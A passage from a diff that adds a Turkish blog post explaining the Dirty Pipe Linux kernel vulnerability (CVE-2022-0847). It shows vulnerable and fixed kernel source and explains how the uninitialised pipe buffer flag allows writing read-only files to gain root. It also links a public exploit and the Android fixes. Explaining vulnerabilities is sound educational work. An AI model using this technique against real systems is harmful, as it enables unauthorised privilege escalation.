+<span class="w">    </span><span class="n">pipe</span><span class="o">-&gt;</span><span class="n">head</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">i_head</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span><span class="w"></span>
+<span class="w">    </span><span class="n">i</span><span class="o">-&gt;</span><span class="n">iov_offset</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">offset</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">bytes</span><span class="p">;</span><span class="w"></span>
+<span class="w">    </span><span class="n">i</span><span class="o">-&gt;</span><span class="n">head</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">i_head</span><span class="p">;</span><span class="w"></span>
+<span class="nl">out</span><span class="p">:</span><span class="w"></span>
+<span class="w">    </span><span class="n">i</span><span class="o">-&gt;</span><span class="n">count</span><span class="w"> </span><span class="o">-=</span><span class="w"> </span><span class="n">bytes</span><span class="p">;</span><span class="w"></span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">bytes</span><span class="p">;</span><span class="w"></span>
+<span class="p">}</span><span class="w"></span>
+</code></pre></div>
+
+<p>Yukarıda buffer yapısı içerisinde flag’in doğru düzgün biçimde initialize edilmediğini görmekteyiz. Dananın kuyruğu da burada kopuyor işte. Burada yukarıda bahsettiğimiz gibi verimlilik için okuma işlemi splice ile yapılıyor ve ilgili sistem çağrısı da veriyi(byteları) almak yerine aslında o veriyi tutan memory page’ini değer olarak alıyor. bknz: call by reference. Tabi bu kısımda ayrıca Copy on write’a da değinmek gerekiyor ama böyle gidersek işin içinden bu yazı içerisinde çıkamayız. Orada da DirtyCow’u açıklamak elzem olur. Bu konuda Türkçe yazı var mı bilmiyorum araştırabilirsiniz diye düşünüyorum. Bana sevgili Emrah kardeşim anlattığı için ayrıca teşekkür ederim. Her neyse devam edelim.</p>
+<p>İşlem boyunca flagin initialize(ilk değer verme?) edilmediğini söylemiştik. Bu sebeple biz boruyu daha doğrusu bufferdaki tüm verileri ilgili FLAG ile doldurup boşaltabiliriz. Bu boşaltmadan sonra ise biz tüm bufferdaki verilere “<strong>PIPE_BUF_FLAG_CAN_MERGE”</strong> bayrağını işaretlediğimiz için küçük bir alana(1 baytcık) yazabiliriz. İlgili işlemlerin kernel üzerinde gerçekleştirildiğini unutmayalım. Herhangi bir denetime tabi değil bu aşamada. Bu sebeple de istediğimiz dosyaya (read only) yazıp root olabiliriz. </p>
+<p>Exploit kodunu incelemek için:</p>
+<p><a href="https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits/blob/main/exploit-2.c#L143">https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits/blob/main/exploit-2.c#L143</a></p>
+<p>Aslında patchten sonra ve öncesi için de bir kod bloğu eklemem gerek sanırım bu sebeple aşağıya fixlenmemiş ve fixlenmiş kaynak kodunu ekliyorum. </p>
+<p>Vulnerable:</p>
+<div class="highlight"><pre><span></span><code><span class="k">static</span><span class="w"> </span><span class="kt">size_t</span><span class="w"> </span><span class="nf">copy_page_to_iter_pipe</span><span class="p">(</span><span class="k">struct</span><span class="w"> </span><span class="nc">page</span><span class="w"> </span><span class="o">*</span><span class="n">page</span><span class="p">,</span><span class="w"> </span><span class="kt">size_t</span><span class="w"> </span><span class="n">offset</span><span class="p">,</span><span class="w"> </span><span class="kt">size_t</span><span class="w"> </span><span class="n">bytes</span><span class="p">,</span><span class="w"></span>
+<span class="w">             </span><span class="k">struct</span><span class="w"> </span><span class="nc">iov_iter</span><span class="w"> </span><span class="o">*</span><span class="n">i</span><span class="p">)</span><span class="w"></span>
+<span class="p">{</span><span class="w"></span>
+<span class="w">    </span><span class="k">struct</span><span class="w"> </span><span class="nc">pipe_inode_info</span><span class="w"> </span><span class="o">*</span><span class="n">pipe</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">i</span><span class="o">-&gt;</span><span class="n">pipe</span><span class="p">;</span><span class="w"></span>
+<span class="w">    </span><span class="k">struct</span><span class="w"> </span><span class="nc">pipe_buffer</span><span class="w"> </span><span class="o">*</span><span class="n">buf</span><span class="p">;</span><span class="w"></span>
+<span class="w">    </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">p_tail</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">pipe</span><span class="o">-&gt;</span><span class="n">tail</span><span class="p">;</span><span class="w"></span>
+<span class="w">    </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">p_mask</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">pipe</span><span class="o">-&gt;</span><span class="n">ring_size</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span><span class="w"></span>
+<span class="w">    </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">i_head</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">i</span><span class="o">-&gt;</span><span class="n">head</span><span class="p">;</span><span class="w"></span>
+<span class="w">    </span><span class="kt">size_t</span><span class="w"> </span><span class="n">off</span><span class="p">;</span><span class="w"></span>
+
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">unlikely</span><span class="p">(</span><span class="n">bytes</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">i</span><span class="o">-&gt;</span><span class="n">count</span><span class="p">))</span><span class="w"></span>
+<span class="w">        </span><span class="n">bytes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">i</span><span class="o">-&gt;</span><span class="n">count</span><span class="p">;</span><span class="w"></span>
+
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">unlikely</span><span class="p">(</span><span class="o">!</span><span class="n">bytes</span><span class="p">))</span><span class="w"></span>
+<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>
+
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">sanity</span><span class="p">(</span><span class="n">i</span><span class="p">))</span><span class="w"></span>
+<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>
+
+<span class="w">    </span><span class="n">off</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">i</span><span class="o">-&gt;</span><span class="n">iov_offset</span><span class="p">;</span><span class="w"></span>
+<span class="w">    </span><span class="n">buf</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">&amp;</span><span class="n">pipe</span><span class="o">-&gt;</span><span class="n">bufs</span><span class="p">[</span><span class="n">i_head</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">p_mask</span><span class="p">];</span><span class="w"></span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">off</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">offset</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">off</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">buf</span><span class="o">-&gt;</span><span class="n">page</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">page</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+
+<span class="w">            </span><span class="n">buf</span><span class="o">-&gt;</span><span class="n">len</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="n">bytes</span><span class="p">;</span><span class="w"></span>
+<span class="w">            </span><span class="n">i</span><span class="o">-&gt;</span><span class="n">iov_offset</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="n">bytes</span><span class="p">;</span><span class="w"></span>
+<span class="w">            </span><span class="k">goto</span><span class="w"> </span><span class="n">out</span><span class="p">;</span><span class="w"></span>
+<span class="w">        </span><span class="p">}</span><span class="w"></span>
+<span class="w">        </span><span class="n">i_head</span><span class="o">++</span><span class="p">;</span><span class="w"></span>
+<span class="w">        </span><span class="n">buf</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">&amp;</span><span class="n">pipe</span><span class="o">-&gt;</span><span class="n">bufs</span><span class="p">[</span><span class="n">i_head</span><span class="w"> </span><span class="o">&amp;</span><span class="w"> </span><span class="n">p_mask</span><span class="p">];</span><span class="w"></span>
+<span class="w">    </span><span class="p">}</span><span class="w"></span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">pipe_full</span><span class="p">(</span><span class="n">i_head</span><span class="p">,</span><span class="w"> </span><span class="n">p_tail</span><span class="p">,</span><span class="w"> </span><span class="n">pipe</span><span class="o">-&gt;</span><span class="n">max_usage</span><span class="p">))</span><span class="w"></span>
+<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>
+
+<span class="w">    </span><span class="n">buf</span><span class="o">-&gt;</span><span class="n">ops</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">&amp;</span><span class="n">page_cache_pipe_buf_ops</span><span class="p">;</span><span class="w"> </span><span class="c1">// Bu kısıma dikkat edin. </span>
+<span class="w">    </span><span class="n">get_page</span><span class="p">(</span><span class="n">page</span><span class="p">);</span><span class="w"> </span><span class="c1">// </span>
+<span class="w">    </span><span class="n">buf</span><span class="o">-&gt;</span><span class="n">page</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">page</span><span class="p">;</span><span class="w"> </span><span class="c1">//</span>
+<span class="w">    </span><span class="n">buf</span><span class="o">-&gt;</span><span class="n">offset</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">offset</span><span class="p">;</span><span class="w"> </span><span class="c1">//</span>
+<span class="w">    </span><span class="n">buf</span><span class="o">-&gt;</span><span class="n">len</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">bytes</span><span class="p">;</span><span class="w"> </span><span class="c1">//</span>
+
+<span class="w">    </span><span class="n">pipe</span><span class="o">-&gt;</span><span class="n">head</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">i_head</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">1</span><span class="p">;</span><span class="w"></span>
+<span class="w">    </span><span class="n">i</span><span class="o">-&gt;</span><span class="n">iov_offset</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">offset</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">bytes</span><span class="p">;</span><span class="w"></span>
+<span class="w">    </span><span class="n">i</span><span class="o">-&gt;</span><span class="n">head</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">i_head</span><span class="p">;</span><span class="w"></span>
+<span class="nl">out</span><span class="p">:</span><span class="w"></span>
+<span class="w">    </span><span class="n">i</span><span class="o">-&gt;</span><span class="n">count</span><span class="w"> </span><span class="o">-=</span><span class="w"> </span><span class="n">bytes</span><span class="p">;</span><span class="w"></span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">bytes</span><span class="p">;</span><span class="w"></span>
+<span class="p">}</span><span class="w"></span>
+</code></pre></div>
+
+<p><a href="https://github.com/torvalds/linux/blob/f6dd975583bd8ce088400648fd9819e4691c8958/lib/iov_iter.c#L367">https://github.com/torvalds/linux/blob/f6dd975583bd8ce088400648fd9819e4691c8958/lib/iov_iter.c#L367</a></p>
+<p>Fixlenmiş hali:</p>
+<div class="highlight"><pre><span></span><code><span class="k">static</span><span class="w"> </span><span class="kt">size_t</span><span class="w"> </span><span class="nf">copy_page_to_iter_pipe</span><span class="p">(</span><span class="k">struct</span><span class="w"> </span><span class="nc">page</span><span class="w"> </span><span class="o">*</span><span class="n">page</span><span class="p">,</span><span class="w"> </span><span class="kt">size_t</span><span class="w"> </span><span class="n">offset</span><span class="p">,</span><span class="w"> </span><span class="kt">size_t</span><span class="w"> </span><span class="n">bytes</span><span class="p">,</span><span class="w"></span>
+<span class="w">             </span><span class="k">struct</span><span class="w"> </span><span class="nc">iov_iter</span><span class="w"> </span><span class="o">*</span><span class="n">i</span><span class="p">)</span><span class="w"></span>
+<span class="p">{</span><span class="w"></span>
+<span class="w">    </span><span class="k">struct</span><span class="w"> </span><span class="nc">pipe_inode_info</span><span class="w"> </span><span class="o">*</span><span class="n">pipe</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">i</span><span class="o">-&gt;</span><span class="n">pipe</span><span class="p">;</span><span class="w"></span>
+<span class="w">    </span><span class="k">struct</span><span class="w"> </span><span class="nc">pipe_buffer</span><span class="w"> </span><span class="o">*</span><span class="n">buf</span><span class="p">;</span><span class="w"></span>
+<span class="w">    </span><span class="kt">size_t</span><span class="w"> </span><span class="n">off</span><span class="p">;</span><span class="w"></span>
+<span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">idx</span><span class="p">;</span><span class="w"></span>
+
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">unlikely</span><span class="p">(</span><span class="n">bytes</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">i</span><span class="o">-&gt;</span><span class="n">count</span><span class="p">))</span><span class="w"></span>
+<span class="w">        </span><span class="n">bytes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">i</span><span class="o">-&gt;</span><span class="n">count</span><span class="p">;</span><span class="w"></span>
+
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">unlikely</span><span class="p">(</span><span class="o">!</span><span class="n">bytes</span><span class="p">))</span><span class="w"></span>
+<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>
+
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="o">!</span><span class="n">sanity</span><span class="p">(</span><span class="n">i</span><span class="p">))</span><span class="w"></span>
+<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>
+
+<span class="w">    </span><span class="n">off</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">i</span><span class="o">-&gt;</span><span class="n">iov_offset</span><span class="p">;</span><span class="w"></span>
+<span class="w">    </span><span class="n">idx</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">i</span><span class="o">-&gt;</span><span class="n">idx</span><span class="p">;</span><span class="w"></span>
+<span class="w">    </span><span class="n">buf</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">&amp;</span><span class="n">pipe</span><span class="o">-&gt;</span><span class="n">bufs</span><span class="p">[</span><span class="n">idx</span><span class="p">];</span><span class="w"></span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">off</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">offset</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">off</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">buf</span><span class="o">-&gt;</span><span class="n">page</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">page</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
+<span class="w">            </span><span class="cm">/* merge with the last one */</span><span class="w"></span>
+<span class="w">            </span><span class="n">buf</span><span class="o">-&gt;</span><span class="n">len</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="n">bytes</span><span class="p">;</span><span class="w"></span>
+<span class="w">            </span><span class="n">i</span><span class="o">-&gt;</span><span class="n">iov_offset</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="n">bytes</span><span class="p">;</span><span class="w"></span>
+<span class="w">            </span><span class="k">goto</span><span class="w"> </span><span class="n">out</span><span class="p">;</span><span class="w"></span>
+<span class="w">        </span><span class="p">}</span><span class="w"></span>
+<span class="w">        </span><span class="n">idx</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">next_idx</span><span class="p">(</span><span class="n">idx</span><span class="p">,</span><span class="w"> </span><span class="n">pipe</span><span class="p">);</span><span class="w"></span>
+<span class="w">        </span><span class="n">buf</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">&amp;</span><span class="n">pipe</span><span class="o">-&gt;</span><span class="n">bufs</span><span class="p">[</span><span class="n">idx</span><span class="p">];</span><span class="w"></span>
+<span class="w">    </span><span class="p">}</span><span class="w"></span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="n">idx</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="n">pipe</span><span class="o">-&gt;</span><span class="n">curbuf</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">pipe</span><span class="o">-&gt;</span><span class="n">nrbufs</span><span class="p">)</span><span class="w"></span>
+<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>
+<span class="w">    </span><span class="n">pipe</span><span class="o">-&gt;</span><span class="n">nrbufs</span><span class="o">++</span><span class="p">;</span><span class="w"></span>
+<span class="w">    </span><span class="n">buf</span><span class="o">-&gt;</span><span class="n">ops</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="o">&amp;</span><span class="n">page_cache_pipe_buf_ops</span><span class="p">;</span><span class="w"> </span><span class="c1">//</span>
+<span class="w">    </span><span class="n">buf</span><span class="o">-&gt;</span><span class="n">flags</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="c1">// Burada tekrar initialize ediliyor.</span>
+<span class="w">    </span><span class="n">get_page</span><span class="p">(</span><span class="n">buf</span><span class="o">-&gt;</span><span class="n">page</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">page</span><span class="p">);</span><span class="w"></span>
+<span class="w">    </span><span class="n">buf</span><span class="o">-&gt;</span><span class="n">offset</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">offset</span><span class="p">;</span><span class="w"> </span><span class="c1">// </span>
+<span class="w">    </span><span class="n">buf</span><span class="o">-&gt;</span><span class="n">len</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">bytes</span><span class="p">;</span><span class="w"> </span><span class="c1">//</span>
+<span class="w">    </span><span class="n">i</span><span class="o">-&gt;</span><span class="n">iov_offset</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">offset</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">bytes</span><span class="p">;</span><span class="w"></span>
+<span class="w">    </span><span class="n">i</span><span class="o">-&gt;</span><span class="n">idx</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">idx</span><span class="p">;</span><span class="w"></span>
+<span class="nl">out</span><span class="p">:</span><span class="w"></span>
+<span class="w">    </span><span class="n">i</span><span class="o">-&gt;</span><span class="n">count</span><span class="w"> </span><span class="o">-=</span><span class="w"> </span><span class="n">bytes</span><span class="p">;</span><span class="w"></span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">bytes</span><span class="p">;</span><span class="w"></span>
+<span class="p">}</span><span class="w"></span>
+</code></pre></div>
+
+<p><a href="https://github.com/engstk/op6/blob/609e7a1d9e752235ba8e8f21dff67e4ddefa14dd/lib/iov_iter.c#L339">https://github.com/engstk/op6/blob/609e7a1d9e752235ba8e8f21dff67e4ddefa14dd/lib/iov_iter.c#L339</a></p>
+<p>Android tarafındaki fix de aynı şekilde geçiyor. </p>
+<p><a href="https://android.googlesource.com/kernel/common/+/aa3e9c7480830f38390a61501386be4a03efb88d/lib/iov_iter.c">https://android.googlesource.com/kernel/common/+/aa3e9c7480830f38390a61501386be4a03efb88d/lib/iov_iter.c</a></p>
+<p><a href="https://android-review.googlesource.com/c/kernel/common/+/1998671/1/lib/iov_iter.c">https://android-review.googlesource.com/c/kernel/common/+/1998671/1/lib/iov_iter.c</a></p>
+<h2>Tarihçesi</h2>
+<p>Kısaca bahsedersek (direkt wikiden alıyorum).</p>
+<p>Konsept ilk olarak “<a href="https://en.wikipedia.org/wiki/Douglas_McIlroy">Douglas McIlroy</a>” tarafından ortaya atılıyor. 1973 yılında ise fikri Ken Thomson tarafından Linux’a <strong>pipe()</strong> sistem çağrısıyla, Linux V3 ile implemente ediliyor. Douglas Mcllroy abimiz Ken Thomson’a “<strong>|</strong>” notasyonu sebebiyle respect çakmayı da unutmuyor tabi ki. </p>
+<h2>Son</h2>
+<p>Yazının son kısımları sanki boş kağıdı doldurmaya çalışan öğrenci gibi oldu ama gerekli olur diye eklemek istedim. Gözlerinizi bozduysam affola.</p>
+<p>Klasik olarak yazı sonu şarkısını ekleyip bu yazıyı sonlandıralım. Bu sefer yine karar veremeyip 2 tane şarkı ekliyorum. Okuduğunuz için teşekkürler:</p>
+<p><a href="https://www.youtube.com/watch?v=5wzntE1XNrs" title="Pera - Sensiz Ben"><img alt="Pera - Sensiz Ben" src="https://res.cloudinary.com/marcomontalbano/image/upload/v1696975449/video_to_markdown/images/youtube--5wzntE1XNrs-c05b58ac6eb4c4700831b2b3070cd403.jpg"></a></p>
+<p><a href="https://www.youtube.com/watch?v=N-bj9HpGTOA" title="Murat Yılmazyıldırım - Adsız Özlem"><img alt="Murat Yılmazyıldırım - Adsız Özlem" src="https://res.cloudinary.com/marcomontalbano/image/upload/v1696975533/video_to_markdown/images/youtube--N-bj9HpGTOA-c05b58ac6eb4c4700831b2b3070cd403.jpg"></a></p>
+<h2>Referanslar</h2>
+<hr>
+<ol>
+<li><a href="https://en.wikipedia.org/wiki/Pipeline_(Unix)">https://en.wikipedia.org/wiki/Pipeline_(Unix)</a></li>
+<li><a href="https://tldp.org/LDP/lpg/node10.html">https://tldp.org/LDP/lpg/node10.html</a></li>
+<li><a href="https://lore.kernel.org/lkml/20220221100313.1504449-1-max.kellermann@ionos.com/">https://lore.kernel.org/lkml/20220221100313.1504449-1-max.kellermann@ionos.com/</a></li>
+<li><a href="https://dirtypipe.cm4all.com/">https://dirtypipe.cm4all.com/</a></li>
+</ol>
+        </article>
+
+        <footer>
+            <p>This entry is posted in <a href="https://enesergun.net/category/linux.html">linux</a>.</p>
+        </footer>
+
+<div class="comments">
+    <div id="disqus_thread"></div>
+    <script type="text/javascript">
+        var disqus_shortname = '0x656e';
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+    </script>
+    <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    <a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</div>
+
+    </div>
+
+
+<footer class="blog-footer">
+
+    <ul class="nav">
+            <li><a href="https://devilinside.me/"> Eşelyon</a></li>
+            <li><a href="https://medium.com/@brkalbyrk"> Berk Albayrak</a></li>
+            <li><a href="https://ahmtglr.wordpress.com/"> Ahmet Güler</a></li>
+            <li><a href="https://kaganisildak.com/"> Kağan Işıldak</a></li>
+            <li><a href="https://eybisi.run/"> Eybisi</a></li>
+            <li><a href="https://onur.im/"> Onur Aslan</a></li>
+            <li><a href="https://canyoupwn.me/"> Canyoupwn.me</a></li>
+            <li><a href="https://www.oguzozkeroglu.com"> Oğuz Özkeroğlu</a></li>
+            <li><a href="https://aligoren.com"> Ali Gören</a></li>
+            <li><a href="https://0xf61.gitlab.io/"> Emir Kurt</a></li>
+<br>
+            <li><a href="www.twitter.com/eness_ergun">Twitter</a></li>
+            <li><a href="info@enesergun.net">Mail</a></li>
+    </ul>
+
+    <p class="disclaimer">
+    Built with <a href="http://getpelican.com">Pelican</a>, and <a href="https://github.com/ka1nsha/MBPelican">MB Pelican</a> theme.
+    </p>
+</footer>
+            </div>
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-WJ9HG4F8NE"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-WJ9HG4F8NE');
+</script>
+    </body>
+</html>
